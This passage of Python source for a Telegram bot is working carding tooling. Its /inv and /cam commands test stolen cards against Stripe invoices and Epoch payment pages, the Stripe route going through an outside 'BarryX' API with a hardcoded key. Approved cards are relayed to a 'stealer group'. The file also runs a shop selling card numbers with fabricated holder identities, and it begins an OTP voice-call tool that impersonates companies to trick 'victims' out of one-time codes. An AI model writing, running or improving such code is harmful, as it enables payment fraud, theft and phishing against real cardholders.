            "▸ <code>/inv [invoice_url]\ncard1|mm|yy|cvv\ncard2|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/inv https://invoice.stripe.com/i/acct_xxx/inv_xxx 4242424242424242|12|25|123</code>\n\n"
            "<b>Supported URLs:</b>\n"
            "• invoice.stripe.com\n"
            "• Any Stripe invoice URL",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Only trigger on /inv command OR invoice.stripe.com URLs (NOT checkout URLs - those use /co)
    if message.text.startswith("/inv"):
        full_text = re.sub(r'^/inv\s*', '', message.text)
    elif "invoice.stripe.com" in message.text.lower():
        full_text = message.text
    else:
        # Don't trigger on checkout.stripe.com or other URLs - those use /co command
        return
    
    print(f"DEBUG: Cleaned Text: {full_text}")
    
    # Extract invoice URL - Very broad match for anything stripe.com
    url_pattern = r'(https?://\S*stripe\.com\S*)'
    url_matches = re.findall(url_pattern, full_text)
    
    invoice_url = None
    if url_matches:
        # Take the first match and clean it
        invoice_url = url_matches[0].split(' ')[0].split('\n')[0].strip(')').strip(']').strip(',')
        # Standardize the sap param if it looks mangled
        if "?sap" in invoice_url.lower() or "s=ap" in invoice_url.lower():
            if "?" in invoice_url:
                base = invoice_url.split('?')[0]
                invoice_url = base + "?s=ap"
            else:
                invoice_url += "?s=ap"
    
    print(f"DEBUG: Final URL: {invoice_url}")

    # Extract all cards (format: cc|mm|yy|cvv)
    card_pattern = r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})'
    card_matches = re.findall(card_pattern, full_text)
    
    print(f"DEBUG: Extracted Cards: {len(card_matches)}")

    # If we have cards but no URL, and it's not a /inv command, it might be a regular CC check - let other handlers handle it
    if not invoice_url and not message.text.startswith("/inv"):
        return

    if not invoice_url:
        await message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "Please provide a valid Stripe invoice URL.\n\n"
            "<code>/inv [invoice_url] [cc|mm|yy|cvv]</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not card_matches:
        # Only reply if they actually used /inv
        if message.text.startswith("/inv"):
            await message.reply_text(
                "❌ <b>No Valid Cards Found!</b>\n\n"
                "Use format: <code>CC|MM|YY|CVV</code>",
                parse_mode=ParseMode.HTML
            )
        return
    
    # Use the extracted URL
    invoice_url = invoice_url
    
    # Limit to 10 cards
    cards = card_matches[:10]
    total_cards = len(cards)
    
    username = user.username or user.first_name
    
    # Mass card mode - try each card until success
    if total_cards > 1:
        loading_msg = await message.reply_text(
            f"🧾 <b>Mass Invoice Hitter</b>\n\n"
            f"📋 Cards: {total_cards}\n"
            f"🔗 Invoice: {invoice_url[:40]}...\n\n"
            f"⏳ Trying cards one by one...",
            parse_mode=ParseMode.HTML
        )
        
        async with aiohttp.ClientSession() as session:
            results = []
            for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
                card_str = f"{cc}|{mm}|{yy}|{cvv}"
                
                await loading_msg.edit_text(
                    f"🧾 <b>Mass Invoice Hitter</b>\n\n"
                    f"📋 Card {idx}/{total_cards}\n"
                    f"💳 <code>{cc[:6]}******{cc[-4:]}</code>\n\n"
                    f"⏳ Checking...",
                    parse_mode=ParseMode.HTML
                )
                
                try:
                    start_time = time_module.time()
                    
                    payload = {
                        "key": "BRY-KESNP-TUPWH-JFOT9",
                        "card": card_str,
                        "invoice_url": invoice_url,
                        "proxy": "" # Using BarryX default proxy for now to avoid 503 error
                    }
                    
                    async with session.post(
                        "https://api.barryxapi.xyz/stripe_invoice",
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=90)
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                        else:
                            data = {"status": "error", "message": f"API Error {resp.status}"}
                    
                    elapsed = time_module.time() - start_time
                    
                    status = str(data.get('status', data.get('Status', 'error'))).upper()
                    if isinstance(data.get('result'), dict):
                        res_data = data['result']
                    else:
                        res_data = data
                    response_msg = str(res_data.get('message', res_data.get('response', res_data.get('Message', res_data.get('Response', res_data.get('error', str(data)))))))
                    
                    bin_info = get_bin_info(cc)
                    bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
                    if bin_info.get('type'):
                        bin_type += f" - {bin_info.get('type', '').upper()}"
                    
                    is_success = status == 'APPROVED' or status == 'TRUE' or status == 'SUCCESS' or res_data.get('status') == 'Approved' or 'approved' in response_msg.lower() or 'success' in response_msg.lower() or 'charged' in response_msg.lower()
                    
                    if is_success:
                        results.append(f"<code>{card_str}</code> -> ✅ {response_msg}")
                        log_approved_card(user.id, username, cc, mm, yy, cvv, "inv", response_msg, bin_info)
                        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "inv", response_msg, bin_info, user.id, username)
                        
                        response = (
                            f"🎉 <b>PAYMENT SUCCESS!</b>\n\n"
                            f"Card: <code>{card_str}</code>\n"
                            f"Status: ✅ CHARGED\n"
                            f"Response: {response_msg}\n"
                            f"Gateway: Stripe Invoice\n\n"
                            f"Brand: {bin_type}\n"
                            f"Bank: {bin_info.get('bank', 'Unknown')}\n"
                            f"Country: {bin_info.get('country', 'Unknown').upper()}\n\n"
                            f"<b>Check History:</b>\n" + "\n".join(results) + "\n\n"
                            f"Cards Tried: {idx}/{total_cards}\n"
                            f"Time: {elapsed:.2f}s\n"
                            f"Checked By: {username}"
                        )
                        try:
                            success_gif = get_sexy_anime_gif("success")
                            await message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
                            await loading_msg.delete()
                        except:
                            await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
                        return  # Stop on success
                    else:
                        results.append(f"<code>{card_str}</code> -> ❌ {response_msg}")
                    
                    # Add delay between cards
                    await asyncio.sleep(1)
                    
                except Exception as e:
                    results.append(f"<code>{card_str}</code> -> ❌ Error")
                    continue  # Try next card
            
            # All cards failed
            failed_response = (
                f"❌ <b>All Cards Failed</b>\n\n"
                f"<b>Check History:</b>\n" + "\n".join(results) + "\n\n"
                f"Gateway: Stripe Invoice\n"
                f"Checked By: {username}"
            )
            await loading_msg.edit_text(failed_response, parse_mode=ParseMode.HTML)

        return
    
    # Single card mode
    cc, mm, yy, cvv = cards[0]
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    
    loading_msg = await message.reply_text(
        f"🧾 <b>Hitting Invoice...</b>\n\n"
        f"<code>{cc[:6]}{'*' * 6}{cc[-4:]}</code>\n"
        f"URL: {invoice_url[:50]}...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        start_time = time_module.time()
        
        # BarryX Stripe Invoice API
        payload = {
            "key": "BRY-KESNP-TUPWH-JFOT9",
            "card": card_str,
            "invoice_url": invoice_url,
            "proxy": "" # Using BarryX default proxy for now to avoid 503 error
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://api.barryxapi.xyz/stripe_invoice",
                json=payload,
                timeout=aiohttp.ClientTimeout(total=90)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                else:
                    data = {"status": "error", "message": f"API Error {resp.status}"}
        
        elapsed = time_module.time() - start_time
        
        from modules.gate_checker import get_bin_info
        bin_info = get_bin_info(cc)
        bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
        if bin_info.get('type'):
            bin_type += f" - {bin_info.get('type', '').upper()}"
        
        status = str(data.get('status', data.get('Status', 'error'))).upper()
        
        # Handle nested or flat response data
        if isinstance(data.get('result'), dict):
            res_data = data['result']
        else:
            res_data = data
            
        response_msg = str(res_data.get('message', res_data.get('response', res_data.get('Message', res_data.get('Response', res_data.get('error', str(data)))))))
        
        # Log the raw data for debugging
        print(f"DEBUG API RESPONSE: {data}")
        
        if status == 'APPROVED' or status == 'TRUE' or status == 'SUCCESS' or res_data.get('status') == 'Approved' or 'approved' in response_msg.lower() or 'success' in response_msg.lower() or 'charged' in response_msg.lower():
            log_approved_card(user.id, username, cc, mm, yy, cvv, "inv", response_msg, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "inv", response_msg, bin_info, user.id, username)
            
            response = (
                f"Card: <code>{card_str}</code>\n"
                f"Status: ✅ CHARGED\n"
                f"Response: {response_msg}\n"
                f"Gateway: Stripe Invoice\n\n"
                f"Brand: {bin_type}\n"
                f"Bank: {bin_info.get('bank', 'Unknown')}\n"
                f"Country: {bin_info.get('country', 'Unknown').upper()}\n\n"
                f"Time: {elapsed:.2f}s\n"
                f"Checked By: {username}"
            )
            try:
                success_gif = get_sexy_anime_gif("success")
                await message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
                await loading_msg.delete()
            except:
                await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
        else:
            response = (
                f"Card: <code>{card_str}</code>\n"
                f"Status: ❌ DECLINED\n"
                f"Response: {response_msg}\n"
                f"Gateway: Stripe Invoice\n\n"
                f"Brand: {bin_type}\n"
                f"Bank: {bin_info.get('bank', 'Unknown')}\n"
                f"Country: {bin_info.get('country', 'Unknown').upper()}\n\n"
                f"Time: {elapsed:.2f}s\n"
                f"Checked By: {username}"
            )
            await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
    
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)[:200]}"), parse_mode=ParseMode.HTML)

# ============================================================================
# EPOCH HITTER - Direct Epoch Payment /cam command
# ============================================================================

@require_premium
async def epoch_hitter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Epoch Hitter - Direct Epoch payment processing - /cam [invoice_url] [cc|mm|yy|cvv]"""
    import aiohttp
    import time as time_module
    import re
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    from modules.gate_checker import get_bin_info

    user = update.effective_user
    message = update.message
    username = user.username or user.first_name

    if not context.args:
        await message.reply_text(
            "🎯 <b>EPOCH HITTER</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/cam [epoch_url] [cc|mm|yy|cvv]</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/cam https://wnu.com/secure/services/joinByCC.php?pi_code=xxx 4242424242424242|12|25|123</code>\n\n"
            "⚡ Direct Epoch Gate",
            parse_mode=ParseMode.HTML
        )
        return

    full_text = message.text[len("/cam"):].strip()

    url_match = re.search(r'(https?://\S+)', full_text)
    invoice_url = url_match.group(1).strip() if url_match else None

    card_match = re.search(r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})', full_text)

    if not invoice_url:
        await message.reply_text(
            "❌ <b>No Epoch URL found!</b>\n\n"
            "Usage: <code>/cam [epoch_url] [cc|mm|yy|cvv]</code>",
            parse_mode=ParseMode.HTML
        )
        return

    if not card_match:
        await message.reply_text(
            "❌ <b>No valid card found!</b>\n\n"
            "Format: <code>CC|MM|YY|CVV</code>",
            parse_mode=ParseMode.HTML
        )
        return

    cc, mm, yy, cvv = card_match.groups()
    if len(yy) == 2:
        yy_full = f"20{yy}"
    else:
        yy_full = yy
    card_str = f"{cc}|{mm}|{yy}|{cvv}"

    loading_msg = await message.reply_text(
        f"🎯 <b>Epoch Hitter</b>\n\n"
        f"💳 Card: <code>{card_str}</code>\n"
        f"🌐 URL: <code>{invoice_url[:60]}...</code>\n\n"
        f"⏳ Hitting Epoch... please wait.",
        parse_mode=ParseMode.HTML
    )

    bin_info = get_bin_info(cc)
    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
    if bin_info.get('type'):
        bin_type += f" - {bin_info.get('type', '').upper()}"

    start_time = time_module.time()
    try:
        browser_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-Ch-Ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
        }

        jar = aiohttp.CookieJar(unsafe=True)
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(headers=browser_headers, cookie_jar=jar, connector=conn) as sess:
            page_text = ""
            final_url = invoice_url
            try:
                async with sess.get(invoice_url, timeout=aiohttp.ClientTimeout(total=20), allow_redirects=True) as resp:
                    page_text = await resp.text()
                    final_url = str(resp.url)
            except Exception as e:
                print(f"[Epoch] Page fetch error: {e}")

            parsed = urlparse(final_url)
            params = parse_qs(parsed.query)
            epoch_host = parsed.hostname or "wnu.com"

            pi_code = params.get('pi_code', [None])[0]
            sku = params.get('sku', [None])[0]

            if not pi_code:
                pi_match = re.search(r'pi_code["\s]*[=:]\s*["\']?([a-zA-Z0-9_-]+)', page_text)
                if pi_match:
                    pi_code = pi_match.group(1)
            if not sku:
                sku_match = re.search(r'name=["\']?sku["\']?\s+value=["\']?([^"\'>\s]+)', page_text, re.IGNORECASE)
                if sku_match:
                    sku = sku_match.group(1)

            hidden_inputs = {}
            for m in re.finditer(r'<input[^>]*type=["\']?hidden["\']?[^>]*>', page_text, re.IGNORECASE):
                tag = m.group(0)
                name_m = re.search(r'name=["\']?([^"\'>\s]+)', tag)
                val_m = re.search(r'value=["\']?([^"\'>\s]*)', tag)
                if name_m:
                    hidden_inputs[name_m.group(1)] = val_m.group(1) if val_m else ''

            form_action = None
            action_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', page_text, re.IGNORECASE)
            if action_match:
                form_action = action_match.group(1)

            submit_url = f"https://{epoch_host}/secure/services/joinByCC.php"
            if form_action:
                if form_action.startswith('http'):
                    submit_url = form_action
                elif form_action.startswith('/'):
                    submit_url = f"https://{epoch_host}{form_action}"

            form_data = {}
            form_data.update(hidden_inputs)

            form_data.update({
                'cardnum': cc,
                'ccnum': cc,
                'card_number': cc,
                'expmonth': mm,
                'expMonth': mm,
                'exp_month': mm,
                'expyear': yy_full,
                'expYear': yy_full,
                'exp_year': yy_full,
                'cvv2': cvv,
                'cvv': cvv,
                'card_cvv': cvv,
                'name': 'John Smith',
                'email': 'johnsmith2024@gmail.com',
                'zip': '10001',
                'zipcode': '10001',
                'country': 'US',
                'ans': '1',
                'agree': '1',
                'submit': 'Join Now',
            })

            if pi_code:
                form_data['pi_code'] = pi_code
            if sku:
                form_data['sku'] = sku

            for k, v in params.items():
                if k not in form_data:
                    form_data[k] = v[0]

            submit_headers = dict(browser_headers)
            submit_headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": f"https://{epoch_host}",
                "Referer": final_url,
                "Sec-Fetch-Site": "same-origin",
            })

            response_text = ""
            response_url = ""
            try:
                async with sess.post(
                    submit_url,
                    data=form_data,
                    headers=submit_headers,
                    timeout=aiohttp.ClientTimeout(total=30),
                    allow_redirects=True
                ) as resp:
                    response_text = await resp.text()
                    response_url = str(resp.url)
            except Exception as e:
                response_text = str(e)

        elapsed = time_module.time() - start_time

        resp_lower = response_text.lower()
        url_lower = response_url.lower()

        is_hit = False
        response_msg = "Declined"

        if any(kw in resp_lower for kw in ['thank you', 'successfully', 'approved', 'welcome', 'membership activated', 'order complete', 'congratulations', 'your account']):
            is_hit = True
            response_msg = "Approved - Transaction Successful"
        elif any(kw in url_lower for kw in ['thank', 'success', 'welcome', 'confirm', 'approved']):
            is_hit = True
            response_msg = "Approved - Redirected to Success"
        elif 'transaction has been approved' in resp_lower:
            is_hit = True
            response_msg = "Transaction Approved"
        elif any(kw in resp_lower for kw in ['declined', 'invalid card', 'card number is invalid', 'do not honor', 'insufficient funds', 'expired card', 'lost card', 'stolen card', 'pickup card', 'restricted card']):
            is_hit = False
            decline_match = re.search(r'(?:error|decline|reason|message)[^<]*?[>:]\s*([^<]+)', response_text, re.IGNORECASE)
            if decline_match:
                response_msg = decline_match.group(1).strip()[:120]
            else:
                for kw in ['declined', 'invalid card', 'do not honor', 'insufficient funds', 'expired card']:
                    if kw in resp_lower:
                        response_msg = kw.title()
                        break
        elif 'error' in resp_lower or 'failed' in resp_lower:
            err_match = re.search(r'(?:class=["\']error[^>]*>|error[^<]*[>:])\s*([^<]+)', response_text, re.IGNORECASE)
            if err_match:
                response_msg = err_match.group(1).strip()[:120]
            else:
                response_msg = "Processing Error"
        elif len(response_text) < 50:
            response_msg = response_text.strip()[:100] if response_text.strip() else "No Response"
        else:
            response_msg = "Unknown Response"

        if is_hit:
            log_approved_card(user.id, username, cc, mm, yy, cvv, "cam", response_msg, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "cam", response_msg, bin_info, user.id, username)
            response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response_msg}", "Epoch Hitter", bin_info, elapsed, username)
            try:
                await loading_msg.delete()
            except:
                pass
            gif_url = get_sexy_anime_gif("success")
            await message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
        else:
            response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response_msg}", "Epoch Hitter", bin_info, elapsed, username)
            try:
                await loading_msg.delete()
            except:
                pass
            gif_url = get_sexy_anime_gif("failed")
            await message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

    except Exception as e:
        elapsed = time_module.time() - start_time
        await loading_msg.edit_text(
            f"❌ <b>Epoch Hitter Error</b>\n\n"
            f"Card: <code>{card_str}</code>\n"
            f"Error: {str(e)[:200]}\n"
            f"Time: {elapsed:.2f}s",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# MAIN FUNCTION
# ============================================================================

async def init_supabase_async():
    """Initialize Supabase connection asynchronously"""
    try:
        result = await init_supabase()
        return result
    except Exception as e:
        print(f"⚠️ Supabase init error: {e}")
        return False

async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start = time.time()
    sent = await update.message.reply_text(f"{EMOJI['bolt']} Pinging...", parse_mode=ParseMode.HTML)
    latency_ms = round((time.time() - start) * 1000)
    uptime_sec = int(time.time() - _bot_start_time)
    hours, rem = divmod(uptime_sec, 3600)
    mins, secs = divmod(rem, 60)
    uptime_str = f"{hours}h {mins}m {secs}s"
    await sent.edit_text(
        f"{EMOJI['bolt']} Pong! Latency: <code>{latency_ms}ms</code> | Uptime: <code>{uptime_str}</code>",
        parse_mode=ParseMode.HTML
    )


# ============================================================================
# CC SHOP BOT COMMANDS
# ============================================================================

async def proxyshop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    from modules.cc_shop import get_user_balance
    from modules.proxy_shop import get_proxy_plans, PROXY_TYPES, PROXY_CATEGORIES

    balance = get_user_balance(user_id)
    plans = get_proxy_plans(active_only=True)

    if not plans:
        await update.message.reply_text(
            f"🌐 <b>Proxy Shop</b>\n\n"
            f"💰 Your Balance: <b>${balance:.2f}</b>\n\n"
            f"No proxy plans available right now.\n\n"
            f"Visit the web panel for more options.",
            parse_mode=ParseMode.HTML
        )
        return

    by_cat = {}
    for p in plans[:30]:
        cat = (p.get('category', '') or 'datacenter').capitalize()
        if cat not in by_cat:
            by_cat[cat] = []
        bw = float(p.get('bandwidth_gb', 0))
        price = float(p.get('price', 0))
        bw_str = 'Unlimited' if bw == 0 else f'{bw:.0f}GB'
        by_cat[cat].append(f"  {html_escape(p['proxy_type'])} | {html_escape(p['name'])} | {bw_str} | ${price:.2f}")

    lines = []
    for cat, items in by_cat.items():
        lines.append(f"\n📦 <b>{cat}</b>")
        lines.extend(items[:10])

    domain = os.environ.get('REPLIT_DEPLOYMENT_URL', '') or os.environ.get('REPLIT_DEV_DOMAIN', '')
    if domain and not domain.startswith('http'):
        domain = f"https://{domain}"
    panel_url = f"{domain}/user/proxyshop" if domain else "/user/proxyshop"

    text = (
        f"🌐 <b>Proxy Shop - Available Plans</b>\n\n"
        f"💰 Your Balance: <b>${balance:.2f}</b>\n"
        + "\n".join(lines) +
        f"\n\n🔗 <b>Buy via Web Panel:</b>\n{html_escape(panel_url)}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def myproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    from modules.proxy_shop import get_user_proxy_purchases, format_proxy_string, bandwidth_meter_text, expire_old_purchases

    expire_old_purchases()
    data = get_user_proxy_purchases(user_id, page=1, per_page=10)

    if not data['purchases']:
        await update.message.reply_text(
            f"🔑 <b>My Proxies</b>\n\nNo active proxy purchases.\nUse /proxyshop to browse plans.",
            parse_mode=ParseMode.HTML
        )
        return

    lines = [f"🔑 <b>My Proxies</b> ({data['total']} total)\n"]
    for p in data['purchases']:
        status = p.get('status', 'active')
        icon = '🟢' if status == 'active' else '🔴'
        proxy_str = format_proxy_string(p)
        bw_text = bandwidth_meter_text(p)
        expires = str(p.get('expires_at', ''))[:16]
        lines.append(
            f"{icon} <b>{html_escape(p.get('plan_name','') or 'Proxy')}</b> [{html_escape(p.get('proxy_type',''))}]\n"
            f"<code>{html_escape(proxy_str)}</code>\n"
            f"{bw_text}\n"
            f"Expires: {expires}\n"
        )

    domain = os.environ.get('REPLIT_DEPLOYMENT_URL', '') or os.environ.get('REPLIT_DEV_DOMAIN', '')
    if domain and not domain.startswith('http'):
        domain = f"https://{domain}"
    panel_url = f"{domain}/user/myproxies" if domain else "/user/myproxies"
    lines.append(f"🔗 <b>View all:</b> {html_escape(panel_url)}")

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def shop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    from modules.cc_shop import get_stock_summary, get_user_balance

    balance = get_user_balance(user_id)
    summary = get_stock_summary()

    if not summary:
        await update.message.reply_text(
            f"💳 <b>CC Shop</b>\n\n"
            f"💰 Your Balance: <b>${balance:.2f}</b>\n\n"
            f"No cards available right now.",
            parse_mode=ParseMode.HTML
        )
        return

    lines = []
    for row in summary[:20]:
        country = row.get('country', 'Unknown')
        code = row.get('country_code', '')
        brand = row.get('brand', '')
        count = row.get('count', 0)
        avg = float(row.get('avg_price', 0))
        lines.append(f"  {country} ({code}) | {brand} | {count} cards | ~${avg:.2f}")

    text = (
        f"💳 <b>CC Shop - Stock Overview</b>\n\n"
        f"💰 Your Balance: <b>${balance:.2f}</b>\n\n"
        f"<b>Available Stock:</b>\n"
        + "\n".join(lines) +
        f"\n\nUse /shopbuy &lt;country&gt; to browse cards"
        f"\nUse /balance to check your balance"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def shopbuy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    from modules.cc_shop import get_available_cards, purchase_card, get_user_balance
    from modules.fake_identity import generate_holder_info
    from modules.bin_lookup import _flag

    args = context.args
    if not args:
        await update.message.reply_text(
            "Usage: /shopbuy &lt;country&gt; or /shopbuy &lt;card_id&gt;\n\n"
            "Examples:\n"
            "  /shopbuy US - Browse US cards\n"
            "  /shopbuy 42 - Buy card #42",
            parse_mode=ParseMode.HTML
        )
        return

    arg = " ".join(args)

    if arg.isdigit():
        card_id = int(arg)
        balance = get_user_balance(user_id)

        from modules.database import _execute_with_retry
        card_info = _execute_with_retry(
            "SELECT country, country_code FROM cc_shop_stock WHERE id = %s AND status = 'available'",
            (card_id,), fetch_one=True
        )
        if not card_info:
            await update.message.reply_text("Card not found or already sold.")
            return

        holder = generate_holder_info(
            country_name=card_info.get('country', ''),
            country_code=card_info.get('country_code', '')
        )
        result = purchase_card(user_id, card_id, holder)
        if result.get('error'):
            await update.message.reply_text(ae(f"❌ {result['error']}"))
            return

        card = result['card']
        cc_full = f"{card['cc_number']}|{card['mm']}|{card['yy']}|{card['cvv']}"
        text = (
            f"✅ <b>Card Purchased!</b>\n\n"
            f"💳 <code>{cc_full}</code>\n\n"
            f"📊 BIN: {card.get('bin6','')} | {card.get('brand','')} | {card.get('card_type','')}\n"
            f"🏦 Bank: {card.get('bank','')}\n"
            f"🌍 Country: {card.get('country','')} ({card.get('country_code','')})\n"
            f"💰 Price: ${result['price']:.2f}\n"
            f"💰 New Balance: ${result['new_balance']:.2f}\n\n"
            f"👤 <b>Holder Info:</b>\n"
            f"  Name: {holder['name']}\n"
            f"  Email: {holder['email']}\n"
            f"  Phone: {holder['phone']}\n"
            f"  Address: {holder['address']}"
        )
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
        return

    stock = get_available_cards(country=arg, page=1, per_page=10)
    if not stock['cards']:
        await update.message.reply_text(f"No cards found for '{arg}'")
        return

    lines = []
    for c in stock['cards']:
        flag = _flag(c.get('country_code', ''))
        lines.append(
            f"  #{c['id']} | {c.get('bin6','')} | {flag} {c.get('country_code','')} | "
            f"{c.get('brand','')} | {c.get('card_type','')} | ${float(c.get('price',0)):.2f}"
        )

    balance = get_user_balance(user_id)
    text = (
        f"💳 <b>CC Shop - {arg.upper()}</b>\n"
        f"💰 Balance: ${balance:.2f}\n\n"
        + "\n".join(lines) +
        f"\n\n{stock['total']} total | Page 1/{stock['pages']}\n"
        f"Use /shopbuy &lt;card_id&gt; to purchase"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    from modules.cc_shop import get_user_balance
    balance = get_user_balance(user_id)
    await update.message.reply_text(
        f"💰 <b>Your Shop Balance</b>\n\n"
        f"Balance: <b>${balance:.2f}</b>\n\n"
        f"Use the web panel or contact admin to add funds.",
        parse_mode=ParseMode.HTML
    )


async def checkout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    try:
        if stripe is None:
            await update.message.reply_text("❌ Stripe is not installed on this deployment.")
            return
        from config import STRIPE_SECRET_KEY, STRIPE_CHECKOUT_PRICE_ID, STRIPE_SUCCESS_URL, STRIPE_CANCEL_URL
        if not STRIPE_SECRET_KEY or not STRIPE_CHECKOUT_PRICE_ID or not STRIPE_SUCCESS_URL or not STRIPE_CANCEL_URL:
            await update.message.reply_text("❌ Stripe checkout is not configured on this deployment.")
            return
        stripe.api_key = STRIPE_SECRET_KEY
        session = stripe.checkout.Session.create(
            mode="payment",
            line_items=[{"price": STRIPE_CHECKOUT_PRICE_ID, "quantity": 1}],
            success_url=STRIPE_SUCCESS_URL,
            cancel_url=STRIPE_CANCEL_URL,
        )
        await update.message.reply_text(
            f"✅ <b>Checkout Session Created</b>\n\n{session.url}",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to create checkout session: {e}")


async def setscript_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return
    script = " ".join(context.args).strip() if context.args else ""
    if not script:
        await update.message.reply_text(
            "❌ Please provide a script.\n\n"
            "Example:\n"
            "<code>/setscript Namaste ji, aapka account block ho gaya hai. 1 dabayein.</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    context.user_data['call_script'] = script
    preview = script[:80] + ("…" if len(script) > 80 else "")
    await update.message.reply_text(
        f"✅ <b>Script saved!</b>\n\n"
        f"📝 <i>{html_escape(preview)}</i>\n\n"
        f"This script will be used for every <code>/call</code> until you <code>/clearscript</code>.",
        parse_mode=ParseMode.HTML,
    )


async def myscript_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return
    script = context.user_data.get('call_script', '')
    if not script:
        await update.message.reply_text(
            "📝 No script saved.\n\n"
            "Use <code>/setscript &lt;your text&gt;</code> to save one.",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(
            f"📝 <b>Your saved script:</b>\n\n<i>{html_escape(script)}</i>",
            parse_mode=ParseMode.HTML,
        )


async def clearscript_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return
    context.user_data.pop('call_script', None)
    await update.message.reply_text("🗑️ Script cleared. Default voice script will be used.")


async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return

    args = context.args
    USAGE = (
        "📞 <b>OTP Call Tool</b>\n\n"
        "<b>Usage:</b>\n"
        "<code>/call &lt;phone&gt; &lt;name&gt; &lt;otp_digits&gt; &lt;company&gt; [lang] [| custom script]</code>\n\n"
        "<b>Arguments:</b>\n"
        "• <code>phone</code> — Target phone with country code (e.g. +12025551234)\n"
        "• <code>name</code> — Victim's name (use _ for spaces, e.g. John_Doe)\n"
        "• <code>otp_digits</code> — Number of OTP digits (4–8)\n"
        "• <code>company</code> — Company to impersonate (e.g. Amazon)\n"
        "• <code>lang</code> — Language: en | hi | es | fr | de | pt\n"
        "  Omit to get a language picker keyboard 🌐\n"
        "• <code>| custom script</code> — Optional: overrides saved script for this call\n\n"
